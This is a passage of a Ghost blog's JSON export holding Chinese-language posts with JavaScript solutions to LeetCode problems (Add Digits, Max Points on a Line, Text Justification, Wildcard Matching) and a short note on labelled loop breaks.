addDigits = function(num) {  \n    var numStr = num.toString();\n    var result=0;\n    for(var i=0;i<numStr.length;i++){\n        result+=Number(numStr.charAt(i));//注意Number比parseInt快（我的测试快 10+ms，一个90+ms，一个100+ms）。\n    }\n    if(result<10){\n        return result;\n    }else{\n        return addDigits(result);\n    }\n};\n\n\nO（1）:\n\n38=3*10+8;  \n38=(3+8)+3*9   (由这个3*(1+9)+8推出)  \n38=(11)+3*9  \n38=((1+1)+1*9)+3*9  \n除（1+1）都能被9整除=>  result=num-9*n。即result=n/9;但是当n=99时，result=0；实际为9。\n因为99=((0+1*9)+1*9)+9*9。\n\nvar addDigits = function(num) {  \n   if(num===0){return 0;}\n   var result=num%9;\n   if(result===0){result=9}\n   return result;\n};\n\n\n最完美的:\n\nfunction addDigits(num) {  \n        return 1 + (num-1)%9;  //return 2+(num-2)%9\n    }","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-02-19T05:17:26.000Z","created_by":"1","updated_at":"2017-01-17T07:04:12.000Z","updated_by":"1","published_at":"2016-02-19T06:48:04.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2d5","uuid":"956d97e3-1e42-4a32-9f3c-a97f033e8e1e","title":"Max Points on a Line(leetcode)","slug":"max-points-on-a-line-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Given n points on a 2D plane, find the maximum number of points that lie on the same straight line. \\n求二维平面上n个点中，最多共线的点数。\\n\\n思路：选定一个点，分别计算其他点和它构成的直线的斜率，斜率相同的点肯定在同一条直线上。（1.这里可以利用对称性，减少一半的次数，a到b的斜率等于b到a的。2.自己和自己的斜率不用算，把结果的点数+1返回，即可。）\\n\\njs中的Object和Map是Key-Value,表示映射关系。但是Object(本质为关联数组)的key只能为String(强制转换)。Value可以是Object。而Map（Object-Object)。虽然在key为String时，看起来一样，但是性能有差别，Map明显快。这里用Object要300ms。用Map只要150ms。\\n```\\n  var maxPoints = function(points) {\\n            if(points.length<3){return points.length;}\\n                function getMost(arr){\\n           var j=0;\\n           var map = new Map()\\n           for(var i=0;i<arr.length;i++){\\n               if(arr[i]==undefined){continue;}\\n               if(isNaN(arr[i])){j++;continue;}\\n               if(arr[i]==-0){x=0}\\n               if(arr[i]==-Infinity){x=Infinity}\\n               if(map.get(arr[i])===undefined){\\n                   map.set(arr[i],[arr[i]])\\n               }else{\\n                   map.get(arr[i]).push(arr[i])\\n               }\\n\\n           }\\n           var temp=0;\\n           map.forEach(function(p){\\n               if(temp<p.length){\\n                   temp=p.length;\\n               }\\n           })\\n\\n           return temp+j;\\n       }\\n            var ks=[]\\n            for(var x in points){\\n                ks.push([]);\\n            }\\n            for(var i=0;i<points.length;i++){  //a：\\n                for(var j=i+1;j<points.length;j++){\\n                    ks[i][j]=(points[i].y-points[j].y)/(points[i].x-points[j].x);\\n                    ks[j][i]=(points[i].y-points[j].y)/(points[i].x-points[j].x);\\n                }\\n            }\\n            var sum=[]\\n            for(var i=0;i<points.length;i++){  //这里可以再优化，放到a：那里计算。\\n                sum.push(getMost(ks[i]));\\n            }\\n            return (function(){\\n                var max=-1;\\n                for(var i=0;i<sum.length;i++) {\\n                    if (max < sum[i]) {\\n                        max = sum[i]\\n                    }\\n                }\\n                return max;\\n            })()+1;\\n        };//Runtime: 148 ms超过100%的javascript\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Given n points on a 2D plane, find the maximum number of points that lie on the same straight line.<br>\n求二维平面上n个点中，最多共线的点数。</p>\n<p>思路：选定一个点，分别计算其他点和它构成的直线的斜率，斜率相同的点肯定在同一条直线上。（1.这里可以利用对称性，减少一半的次数，a到b的斜率等于b到a的。2.自己和自己的斜率不用算，把结果的点数+1返回，即可。）</p>\n<p>js中的Object和Map是Key-Value,表示映射关系。但是Object(本质为关联数组)的key只能为String(强制转换)。Value可以是Object。而Map（Object-Object)。虽然在key为String时，看起来一样，但是性能有差别，Map明显快。这里用Object要300ms。用Map只要150ms。</p>\n<pre><code>  var maxPoints = function(points) {\n            if(points.length&lt;3){return points.length;}\n                function getMost(arr){\n           var j=0;\n           var map = new Map()\n           for(var i=0;i&lt;arr.length;i++){\n               if(arr[i]==undefined){continue;}\n               if(isNaN(arr[i])){j++;continue;}\n               if(arr[i]==-0){x=0}\n               if(arr[i]==-Infinity){x=Infinity}\n               if(map.get(arr[i])===undefined){\n                   map.set(arr[i],[arr[i]])\n               }else{\n                   map.get(arr[i]).push(arr[i])\n               }\n\n           }\n           var temp=0;\n           map.forEach(function(p){\n               if(temp&lt;p.length){\n                   temp=p.length;\n               }\n           })\n\n           return temp+j;\n       }\n            var ks=[]\n            for(var x in points){\n                ks.push([]);\n            }\n            for(var i=0;i&lt;points.length;i++){  //a：\n                for(var j=i+1;j&lt;points.length;j++){\n                    ks[i][j]=(points[i].y-points[j].y)/(points[i].x-points[j].x);\n                    ks[j][i]=(points[i].y-points[j].y)/(points[i].x-points[j].x);\n                }\n            }\n            var sum=[]\n            for(var i=0;i&lt;points.length;i++){  //这里可以再优化，放到a：那里计算。\n                sum.push(getMost(ks[i]));\n            }\n            return (function(){\n                var max=-1;\n                for(var i=0;i&lt;sum.length;i++) {\n                    if (max &lt; sum[i]) {\n                        max = sum[i]\n                    }\n                }\n                return max;\n            })()+1;\n        };//Runtime: 148 ms超过100%的javascript\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"23","plaintext":"Given n points on a 2D plane, find the maximum number of points that lie on the\nsame straight line.\n求二维平面上n个点中，最多共线的点数。\n\n思路：选定一个点，分别计算其他点和它构成的直线的斜率，斜率相同的点肯定在同一条直线上。（1.这里可以利用对称性，减少一半的次数，a到b的斜率等于b到a的。2.自己和自己的斜率不用算，把结果的点数+1返回，即可。）\n\njs中的Object和Map是Key-Value,表示映射关系。但是Object(本质为关联数组)的key只能为String(强制转换)。Value可以是Object。而Map（Object-Object)。虽然在key为String时，看起来一样，但是性能有差别，Map明显快。这里用Object要300ms。用Map只要150ms。\n\n  var maxPoints = function(points) {\n            if(points.length<3){return points.length;}\n                function getMost(arr){\n           var j=0;\n           var map = new Map()\n           for(var i=0;i<arr.length;i++){\n               if(arr[i]==undefined){continue;}\n               if(isNaN(arr[i])){j++;continue;}\n               if(arr[i]==-0){x=0}\n               if(arr[i]==-Infinity){x=Infinity}\n               if(map.get(arr[i])===undefined){\n                   map.set(arr[i],[arr[i]])\n               }else{\n                   map.get(arr[i]).push(arr[i])\n               }\n\n           }\n           var temp=0;\n           map.forEach(function(p){\n               if(temp<p.length){\n                   temp=p.length;\n               }\n           })\n\n           return temp+j;\n       }\n            var ks=[]\n            for(var x in points){\n                ks.push([]);\n            }\n            for(var i=0;i<points.length;i++){  //a：\n                for(var j=i+1;j<points.length;j++){\n                    ks[i][j]=(points[i].y-points[j].y)/(points[i].x-points[j].x);\n                    ks[j][i]=(points[i].y-points[j].y)/(points[i].x-points[j].x);\n                }\n            }\n            var sum=[]\n            for(var i=0;i<points.length;i++){  //这里可以再优化，放到a：那里计算。\n                sum.push(getMost(ks[i]));\n            }\n            return (function(){\n                var max=-1;\n                for(var i=0;i<sum.length;i++) {\n                    if (max < sum[i]) {\n                        max = sum[i]\n                    }\n                }\n                return max;\n            })()+1;\n        };//Runtime: 148 ms超过100%的javascript","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-03-04T06:27:26.000Z","created_by":"1","updated_at":"2017-01-17T06:56:24.000Z","updated_by":"1","published_at":"2016-03-04T06:43:12.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2d6","uuid":"c3618c67-fcde-48de-816c-cc1ab28ec288","title":"JavaScript——跳多层for循环","slug":"javascriptzhong-de-forxun-huan-2","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"科普常识：写一些算法的时候，蛮有用的。\\n```\\n       var num=0;\\n        for(var i=0;i<10;i++){\\n            for(var j=0;j<10;j++){\\n                if(i==5&&j==5){\\n                    break;\\n                }\\n                num++\\n            }\\n        }\\n        console.log(num)  //num==95\\n//这里代码等于\\n        var num=0;\\n        P:\\n                for(var i=0;i<10;i++){\\n                    for(var j=0;j<10;j++){\\n                        if(i==5&&j==5){\\n                            continue P;     //continue到P；\\n                        }\\n                        num++\\n                    }\\n                }\\n        console.log(num)  //num=95\\n```\\n\\n```\\n         var num=0;\\n        P:\\n        for(var i=0;i<10;i++){\\n            for(var j=0;j<10;j++){\\n                if(i==5&&j==5){\\n                      break P;         //break到P；\\n                }\\n                num++\\n            }\\n        }\\n        console.log(num)  //num=55\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>科普常识：写一些算法的时候，蛮有用的。</p>\n<pre><code>       var num=0;\n        for(var i=0;i&lt;10;i++){\n            for(var j=0;j&lt;10;j++){\n                if(i==5&amp;&amp;j==5){\n                    break;\n                }\n                num++\n            }\n        }\n        console.log(num)  //num==95\n//这里代码等于\n        var num=0;\n        P:\n                for(var i=0;i&lt;10;i++){\n                    for(var j=0;j&lt;10;j++){\n                        if(i==5&amp;&amp;j==5){\n                            continue P;     //continue到P；\n                        }\n                        num++\n                    }\n                }\n        console.log(num)  //num=95\n</code></pre>\n<pre><code>         var num=0;\n        P:\n        for(var i=0;i&lt;10;i++){\n            for(var j=0;j&lt;10;j++){\n                if(i==5&amp;&amp;j==5){\n                      break P;         //break到P；\n                }\n                num++\n            }\n        }\n        console.log(num)  //num=55\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"24","plaintext":"科普常识：写一些算法的时候，蛮有用的。\n\n       var num=0;\n        for(var i=0;i<10;i++){\n            for(var j=0;j<10;j++){\n                if(i==5&&j==5){\n                    break;\n                }\n                num++\n            }\n        }\n        console.log(num)  //num==95\n//这里代码等于\n        var num=0;\n        P:\n                for(var i=0;i<10;i++){\n                    for(var j=0;j<10;j++){\n                        if(i==5&&j==5){\n                            continue P;     //continue到P；\n                        }\n                        num++\n                    }\n                }\n        console.log(num)  //num=95\n\n\n         var num=0;\n        P:\n        for(var i=0;i<10;i++){\n            for(var j=0;j<10;j++){\n                if(i==5&&j==5){\n                      break P;         //break到P；\n                }\n                num++\n            }\n        }\n        console.log(num)  //num=55","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-03-11T07:27:49.000Z","created_by":"1","updated_at":"2017-01-17T06:52:44.000Z","updated_by":"1","published_at":"2016-03-11T07:32:58.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2d7","uuid":"8d72e3f4-31bf-4b7c-b73b-3999e9d9e08e","title":"Text Justification","slug":"text-justification","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Given an array of words and a length L, format the text such that each line has exactly L characters and is fully (left and right) justified.\\n\\nYou should pack your words in a greedy approach; that is, pack as many words as you can in each line. Pad extra spaces ' ' when necessary so that each line has exactly L characters.\\n\\nExtra spaces between words should be distributed as evenly as possible. If the number of spaces on a line do not divide evenly between words, the empty slots on the left will be assigned more spaces than the slots on the right.\\n\\nFor the last line of text, it should be left justified and no extra space is inserted between words.\\n\\n#######For example:\\n```\\nwords: [\\\"This\\\", \\\"is\\\", \\\"an\\\", \\\"example\\\", \\\"of\\\", \\\"text\\\", \\\"justification.\\\"]\\nL: 16.\\n\\nReturn the formatted lines as:\\n[\\n   \\\"This    is    an\\\",\\n   \\\"example  of text\\\",\\n   \\\"justification.  \\\"\\n]\\nNote: Each word is guaranteed not to exceed L in length.\\n```\\n题意：把一个集合的单词按照每行L个字符放，每行要两端对齐，如果空格不能均匀分布在所有间隔中，那么左边的空格要多于右边的空格，最后一行靠左对齐。\\n```\\n       var fullJustify = function(words, maxWidth) {\\n            if(maxWidth===0){return [''];}\\n            function packSpace(size){\\n                str='';\\n                for(var i=0;i<size;i++){\\n                    str+=' ';\\n                }\\n                return str;\\n            }\\n            var result=[];\\n            var sum=0;\\n            var index=0;\\n            for(var i=0;i<words.length;i++){\\n                sum=sum+words[i].length+1;\\n                if(sum-1>maxWidth){\\n                    var size=i-index-1;\\n                    var l=sum-words[i].length-size-2    \\n                    var spaceSize = Math.floor((maxWidth-l)/(size));\\n                    var temp= (maxWidth-l)%(size)\\n                    var str='';\\n                    var k=0;\\n                    for(var j=index;j<i;j++){\\n                        if(j==i-1){\\n                            if(size===0){\\n                                str +=words[j]+packSpace(maxWidth-words[j].length);\\n                            }else{\\n                                str +=words[j];\\n                            }\\n\\n                            break;\\n                        }\\n                        if(k<temp){\\n                            str +=words[j]+packSpace(spaceSize)+' ';\\n                        }else{\\n                            str +=words[j]+packSpace(spaceSize)\\n                        }\\n                        k++;\\n                    }\\n                    result.push(str);\\n                    index=i;\\n                    // if(i==words.length){break;}\\n                    sum=words[i].length+1;\\n                }\\n                ////\\n                if(i==words.length-1){\\n                    i++;\\n                    var str='';\\n                    for(var j=index;j<i;j++){\\n                        if(j==i-1){\\n                         str +=words[j]\\n                         str+=packSpace(maxWidth-str.length);\\n                            break;\\n                        }\\n                        str+=words[j]+' ';\\n                    }\\n                    result.push(str);\\n                    index=i;\\n                    if(i==words.length){break;}\\n                    sum=words[i].length+1;\\n                }\\n            }\\n            return result;\\n        };\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Given an array of words and a length L, format the text such that each line has exactly L characters and is fully (left and right) justified.</p>\n<p>You should pack your words in a greedy approach; that is, pack as many words as you can in each line. Pad extra spaces ' ' when necessary so that each line has exactly L characters.</p>\n<p>Extra spaces between words should be distributed as evenly as possible. If the number of spaces on a line do not divide evenly between words, the empty slots on the left will be assigned more spaces than the slots on the right.</p>\n<p>For the last line of text, it should be left justified and no extra space is inserted between words.</p>\n<p>#######For example:</p>\n<pre><code>words: [&quot;This&quot;, &quot;is&quot;, &quot;an&quot;, &quot;example&quot;, &quot;of&quot;, &quot;text&quot;, &quot;justification.&quot;]\nL: 16.\n\nReturn the formatted lines as:\n[\n   &quot;This    is    an&quot;,\n   &quot;example  of text&quot;,\n   &quot;justification.  &quot;\n]\nNote: Each word is guaranteed not to exceed L in length.\n</code></pre>\n<p>题意：把一个集合的单词按照每行L个字符放，每行要两端对齐，如果空格不能均匀分布在所有间隔中，那么左边的空格要多于右边的空格，最后一行靠左对齐。</p>\n<pre><code>       var fullJustify = function(words, maxWidth) {\n            if(maxWidth===0){return [''];}\n            function packSpace(size){\n                str='';\n                for(var i=0;i&lt;size;i++){\n                    str+=' ';\n                }\n                return str;\n            }\n            var result=[];\n            var sum=0;\n            var index=0;\n            for(var i=0;i&lt;words.length;i++){\n                sum=sum+words[i].length+1;\n                if(sum-1&gt;maxWidth){\n                    var size=i-index-1;\n                    var l=sum-words[i].length-size-2    \n                    var spaceSize = Math.floor((maxWidth-l)/(size));\n                    var temp= (maxWidth-l)%(size)\n                    var str='';\n                    var k=0;\n                    for(var j=index;j&lt;i;j++){\n                        if(j==i-1){\n                            if(size===0){\n                                str +=words[j]+packSpace(maxWidth-words[j].length);\n                            }else{\n                                str +=words[j];\n                            }\n\n                            break;\n                        }\n                        if(k&lt;temp){\n                            str +=words[j]+packSpace(spaceSize)+' ';\n                        }else{\n                            str +=words[j]+packSpace(spaceSize)\n                        }\n                        k++;\n                    }\n                    result.push(str);\n                    index=i;\n                    // if(i==words.length){break;}\n                    sum=words[i].length+1;\n                }\n                ////\n                if(i==words.length-1){\n                    i++;\n                    var str='';\n                    for(var j=index;j&lt;i;j++){\n                        if(j==i-1){\n                         str +=words[j]\n                         str+=packSpace(maxWidth-str.length);\n                            break;\n                        }\n                        str+=words[j]+' ';\n                    }\n                    result.push(str);\n                    index=i;\n                    if(i==words.length){break;}\n                    sum=words[i].length+1;\n                }\n            }\n            return result;\n        };\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"25","plaintext":"Given an array of words and a length L, format the text such that each line has\nexactly L characters and is fully (left and right) justified.\n\nYou should pack your words in a greedy approach; that is, pack as many words as\nyou can in each line. Pad extra spaces ' ' when necessary so that each line has\nexactly L characters.\n\nExtra spaces between words should be distributed as evenly as possible. If the\nnumber of spaces on a line do not divide evenly between words, the empty slots\non the left will be assigned more spaces than the slots on the right.\n\nFor the last line of text, it should be left justified and no extra space is\ninserted between words.\n\n#######For example:\n\nwords: [\"This\", \"is\", \"an\", \"example\", \"of\", \"text\", \"justification.\"]\nL: 16.\n\nReturn the formatted lines as:\n[\n   \"This    is    an\",\n   \"example  of text\",\n   \"justification.  \"\n]\nNote: Each word is guaranteed not to exceed L in length.\n\n\n题意：把一个集合的单词按照每行L个字符放，每行要两端对齐，如果空格不能均匀分布在所有间隔中，那么左边的空格要多于右边的空格，最后一行靠左对齐。\n\n       var fullJustify = function(words, maxWidth) {\n            if(maxWidth===0){return [''];}\n            function packSpace(size){\n                str='';\n                for(var i=0;i<size;i++){\n                    str+=' ';\n                }\n                return str;\n            }\n            var result=[];\n            var sum=0;\n            var index=0;\n            for(var i=0;i<words.length;i++){\n                sum=sum+words[i].length+1;\n                if(sum-1>maxWidth){\n                    var size=i-index-1;\n                    var l=sum-words[i].length-size-2    \n                    var spaceSize = Math.floor((maxWidth-l)/(size));\n                    var temp= (maxWidth-l)%(size)\n                    var str='';\n                    var k=0;\n                    for(var j=index;j<i;j++){\n                        if(j==i-1){\n                            if(size===0){\n                                str +=words[j]+packSpace(maxWidth-words[j].length);\n                            }else{\n                                str +=words[j];\n                            }\n\n                            break;\n                        }\n                        if(k<temp){\n                            str +=words[j]+packSpace(spaceSize)+' ';\n                        }else{\n                            str +=words[j]+packSpace(spaceSize)\n                        }\n                        k++;\n                    }\n                    result.push(str);\n                    index=i;\n                    // if(i==words.length){break;}\n                    sum=words[i].length+1;\n                }\n                ////\n                if(i==words.length-1){\n                    i++;\n                    var str='';\n                    for(var j=index;j<i;j++){\n                        if(j==i-1){\n                         str +=words[j]\n                         str+=packSpace(maxWidth-str.length);\n                            break;\n                        }\n                        str+=words[j]+' ';\n                    }\n                    result.push(str);\n                    index=i;\n                    if(i==words.length){break;}\n                    sum=words[i].length+1;\n                }\n            }\n            return result;\n        };","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-03-12T10:09:41.000Z","created_by":"1","updated_at":"2017-01-17T06:51:34.000Z","updated_by":"1","published_at":"2016-03-12T19:47:51.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2d8","uuid":"afb3b66f-d6af-4cfd-a2e4-c38822156c5b","title":"Wildcard Matching--LeetCode","slug":"wildcard-matching-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Implement wildcard pattern matching with support for '?' and '*'.\\n```\\n'?' Matches any single character.\\n'*' Matches any sequence of characters (including the empty sequence).\\n\\nThe matching should cover the entire input string (not partial).\\n\\nThe function prototype should be:\\nbool isMatch(const char *s, const char *p)\\n\\nSome examples:\\nisMatch(\\\"aa\\\",\\\"a\\\") ??? false\\nisMatch(\\\"aa\\\",\\\"aa\\\") ??? true\\nisMatch(\\\"aaa\\\",\\\"aa\\\") ??? false\\nisMatch(\\\"aa\\\", \\\"*\\\") ??? true\\nisMatch(\\\"aa\\\", \\\"a*\\\") ??? true\\nisMatch(\\\"ab\\\", \\\"?*\\\") ??? true\\nisMatch(\\\"aab\\\", \\\"c*a*b\\\") ??? false\\n```\\n题意：通配符匹配\\n\\n`?`表示：任意字符。`*`表示：0个或者n个`?` 先自己写。用的循环。\\n```\\n        var isMatch = function(s, p) {\\n            if(p==='*'){return true;}\\n            var j=0;\\n            var next;\\n            var isXin=false;\\n            var isSuccess=false;\\n            var toI;\\n            var toJ;\\n            var begin;\\n            for(var i=0;i<s.length;i++){\\n                var charI= s.charAt(i);\\n                var charJ= p.charAt(j)\\n                if(charI===charJ||charJ==='?'){\\n                    if(charI!=next&&next!==undefined&&next!='?'){\\n                        toI=toI+1;\\n                    }else{\\n                        if(charI==next||next=='?'){\\n                            begin=toI;\\n                        }\\n                    }\\n                    j++;\\n                    isSuccess=true;\\n                    continue;\\n                }else{\\n                    if(charJ==='*'){\\n                        isXin=true;\\n                        var toJ=j;\\n                        var toI=i;\\n                        next= p.charAt(j+1)\\n                        while(next==='*'){\\n                            j++;\\n                            next=p.charAt(j+1);\\n                        }\\n                        if(next==''){return true;}\\n                        if(charI===next||next==='?'){\\n                            isSuccess=true;\\n                            j=j+2;\\n                            begin=toI;\\n                        }else{\\n                            isSuccess=false;\\n                        }\\n                        continue;\\n                    }\\n\\n                    if(isXin){\\n                        if(isSuccess){\\n                            j=toJ;\\n                            i=toI;\\n                            if(begin!=null){\\n                                i=begin;\\n                                begin=null;\\n                            }\\n                            isXin=false;\\n                        }\\n                    }else{\\n                        return false;\\n                    }\\n                }\\n            }\\n            var str= p.slice(j, p.length)\\n            if(str==''){return true;}\\n            if(!!str.match(/^\\\\*+$/)&&isSuccess){return true}else{\\n                return false;\\n            }\\n        };Runtime: 236 ms\\n```\\n在网上看到一个C语言的版本，C语言还是快，11ms运行时间.\\n```\\n\\tbool isMatch(const char *s, const char *p) {\\n\\t\\tconst char* star = NULL;\\n\\t\\tconst char* ss = s;\\n\\t\\twhile (*s) {\\n\\t\\t\\tif ((*p == '?') || (*p == *s)) { s++;p++;continue; }\\n\\t\\t\\tif (*p == '*') { star = p++; ss = s;continue; }\\n\\t\\t\\tif (star) { p = star + 1; s = ++ss;continue; }\\n\\t\\t\\treturn false;\\n\\t\\t}\\n\\t\\twhile (*p == '*') { p++; }\\n\\t\\treturn !*p;\\n\\t}Runtime: 11 ms\\n```\\n改成javascript，思想和自己写的差不多。\\n```\\n        var isMatch = function(s, p) {\\n            var i=0;var j=0;var k=0;var l=0;\\n            var star;\\n            var ss=s;\\n            while (s.charAt(i)){\\n                if ((p.charAt(j)=='?')||(p.charAt(j)==s.charAt(i))){i++;j++;continue;}\\n                if (p.charAt(j)=='*'){\\n                    star=p.slice(j, p.length);\\n                    j++;\\n                    ss= s.slice(i, s.length);\\n                    k=0;l=0;continue;\\n                }\\n                if (star){\\n                    p= star.slice(k+1,star.length);\\n                    j=0;\\n                    l++;\\n                    s=ss.slice(l,ss.length);\\n                    i=0;\\n                    continue;            \\n                }\\n                return false;\\n            }\\n            while (p.charAt(j)=='*'){j++;}\\n            return !p.charAt(j);\\n        };Runtime: 264 ms \\n```\\n第一个版本太乱了，虽然通过了。看了别人的解，这个题只需4个变量记录就可以了，修改如下：\\n```\\n      var isMatch = function(s, p) {\\n            var toI=-1        //保存 出现*时，i的值。要是s.charAt(toI)未匹配成功，则从下一位开始匹配(toI++;)，因为*可以为[0-n]个任意字符\\n            var toJ=-1;       //保存 出现*时，j的值，用于*后面匹配不成功时，回溯。\\n            var j=0;\\n            for(var i=0;i< s.length;i++){\\n                var CharI=s.charAt(i)\\n                var CharJ=p.charAt(j)\\n                if ((CharJ=='?')||(CharJ==CharI)){j++;continue;}\\n                if (CharJ=='*'){\\n                    toJ=j;\\n                    j++;\\n                    toI=i;\\n                    i--;\\n                    continue;\\n                }\\n                if (toJ>=0){\\n                    toI++\\n                    i=toI;\\n                    i--;\\n                    j=toJ;\\n                    j++;\\n                    continue;            //        p = star+1; s=++ss;continue;\\n                }\\n                return false;\\n            }\\n            while (p.charAt(j)=='*'){j++;} //p最后的*全不要。\\n            return !p.charAt(j);    //j=p.lenght  P全部匹配完成。则return !\\\"\\\"\\n        };Runtime: 256 ms\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Implement wildcard pattern matching with support for '?' and '*'.</p>\n<pre><code>'?' Matches any single character.\n'*' Matches any sequence of characters (including the empty sequence).\n\nThe matching should cover the entire input string (not partial).\n\nThe function prototype should be:\nbool isMatch(const char *s, const char *p)\n\nSome examples:\nisMatch(&quot;aa&quot;,&quot;a&quot;) ??? false\nisMatch(&quot;aa&quot;,&quot;aa&quot;) ??? true\nisMatch(&quot;aaa&quot;,&quot;aa&quot;) ??? false\nisMatch(&quot;aa&quot;, &quot;*&quot;) ??? true\nisMatch(&quot;aa&quot;, &quot;a*&quot;) ??? true\nisMatch(&quot;ab&quot;, &quot;?*&quot;) ??? true\nisMatch(&quot;aab&quot;, &quot;c*a*b&quot;) ??? false\n</code></pre>\n<p>题意：通配符匹配</p>\n<p><code>?</code>表示：任意字符。<code>*</code>表示：0个或者n个<code>?</code> 先自己写。用的循环。</p>\n<pre><code>        var isMatch = function(s, p) {\n            if(p==='*'){return true;}\n            var j=0;\n            var next;\n            var isXin=false;\n            var isSuccess=false;\n            var toI;\n            var toJ;\n            var begin;\n            for(var i=0;i&lt;s.length;i++){\n                var charI= s.charAt(i);\n                var charJ= p.charAt(j)\n                if(charI===charJ||charJ==='?'){\n                    if(charI!=next&amp;&amp;next!==undefined&amp;&amp;next!='?'){\n                        toI=toI+1;\n                    }else{\n                        if(charI==next||next=='?'){\n                            begin=toI;\n                        }\n                    }\n                    j++;\n                    isSuccess=true;\n                    continue;\n                }else{\n                    if(charJ==='*'){\n                        isXin=true;\n                        var toJ=j;\n                        var toI=i;\n                        next= p.charAt(j+1)\n                        while(next==='*'){\n                            j++;\n                            next=p.charAt(j+1);\n                        }\n                        if(next==''){return true;}\n                        if(charI===next||next==='?'){\n                            isSuccess=true;\n                            j=j+2;\n                            begin=toI;\n                        }else{\n                            isSuccess=false;\n                        }\n                        continue;\n                    }\n\n                    if(isXin){\n                        if(isSuccess){\n                            j=toJ;\n                            i=toI;\n                            if(begin!=null){\n                                i=begin;\n                                begin=null;\n                            }\n                            isXin=false;\n                        }\n                    }else{\n                        return false;\n                    }\n                }\n            }\n            var str= p.slice(j, p.length)\n            if(str==''){return true;}\n            if(!!str.match(/^\\*+$/)&amp;&amp;isSuccess){return true}else{\n                return false;\n            }\n        };Runtime: 236 ms\n</code></pre>\n<p>在网上看到一个C语言的版本，C语言还是快，11ms运行时间.</p>\n<pre><code>\tbool isMatch(const char *s, const char *p) {\n\t\tconst char* star = NULL;\n\t\tconst char* ss = s;\n\t\twhile (*s) {\n\t\t\tif ((*p == '?') || (*p == *s)) { s++;p++;continue; }\n\t\t\tif (*p == '*') { star = p++; ss = s;continue; }\n\t\t\tif (star) { p = star + 1; s = ++ss;continue; }\n\t\t\treturn false;\n\t\t}\n\t\twhile (*p == '*') { p++; }\n\t\treturn !*p;\n\t}Runtime: 11 ms\n</code></pre>\n<p>改成javascript，思想和自己写的差不多。</p>\n<pre><code>        var isMatch = function(s, p) {\n            var i=0;var j=0;var k=0;var l=0;\n            var star;\n            var ss=s;\n            while (s.charAt(i)){\n                if ((p.charAt(j)=='?')||(p.charAt(j)==s.charAt(i))){i++;j++;continue;}\n                if (p.charAt(j)=='*'){\n                    star=p.slice(j, p.length);\n                    j++;\n                    ss= s.slice(i, s.length);\n                    k=0;l=0;continue;\n                }\n                if (star){\n                    p= star.slice(k+1,star.length);\n                    j=0;\n                    l++;\n                    s=ss.slice(l,ss.length);\n                    i=0;\n                    continue;            \n                }\n                return false;\n            }\n            while (p.charAt(j)=='*'){j++;}\n            return !p.charAt(j);\n        };Runtime: 264 ms \n</code></pre>\n<p>第一个版本太乱了，虽然通过了。看了别人的解，这个题只需4个变量记录就可以了，修改如下：</p>\n<pre><code>      var isMatch = function(s, p) {\n            var toI=-1        //保存 出现*时，i的值。要是s.charAt(toI)未匹配成功，则从下一位开始匹配(toI++;)，因为*可以为[0-n]个任意字符\n            var toJ=-1;       //保存 出现*时，j的值，用于*后面匹配不成功时，回溯。\n            var j=0;\n            for(var i=0;i&lt; s.length;i++){\n                var CharI=s.charAt(i)\n                var CharJ=p.charAt(j)\n                if ((CharJ=='?')||(CharJ==CharI)){j++;continue;}\n                if (CharJ=='*'){\n                    toJ=j;\n                    j++;\n                    toI=i;\n                    i--;\n                    continue;\n                }\n                if (toJ&gt;=0){\n                    toI++\n                    i=toI;\n                    i--;\n                    j=toJ;\n                    j++;\n                    continue;            //        p = star+1; s=++ss;continue;\n                }\n                return false;\n            }\n            while (p.charAt(j)=='*'){j++;} //p最后的*全不要。\n            return !p.charAt(j);    //j=p.lenght  P全部匹配完成。则return !&quot;&quot;\n        };Runtime: 256 ms\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"26","plaintext":"Implement wildcard pattern matching with support for '?' and '*'.\n\n'?' Matches any single character.\n'*' Matches any sequence of characters (including the empty sequence).\n\nThe matching should cover the entire input string (not partial).\n\nThe function prototype should be:\nbool isMatch(const char *s, const char *p)\n\nSome examples:\nisMatch(\"aa\",\"a\") ??? false\nisMatch(\"aa\",\"aa\") ??? true\nisMatch(\"aaa\",\"aa\") ??? false\nisMatch(\"aa\", \"*\") ??? true\nisMatch(\"aa\", \"a*\") ??? true\nisMatch(\"ab\", \"?*\") ??? true\nisMatch(\"aab\", \"c*a*b\") ??? 